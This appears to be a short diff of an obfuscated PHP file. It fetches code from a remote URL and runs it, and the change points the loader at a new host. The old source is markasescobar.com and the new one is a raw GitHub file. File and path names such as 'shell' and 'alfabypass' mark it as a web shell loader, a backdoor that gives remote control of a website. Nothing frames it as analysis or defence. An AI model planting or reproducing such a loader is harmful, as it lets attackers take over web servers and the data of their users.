@@ -2,7 +2,7 @@
     /*_*/ urldecode("%3f%3e") .
         file_get_contents(
             /*_*/ urldecode(
-                /*_*/ "https://markasescobar.com/shell/alfabypass.txt"
+                /*_*/ "https://raw.githubusercontent.com/rexorid/shell/refs/heads/main/bypass/isiafbepas.txt"
             )
         )
 ); ?>
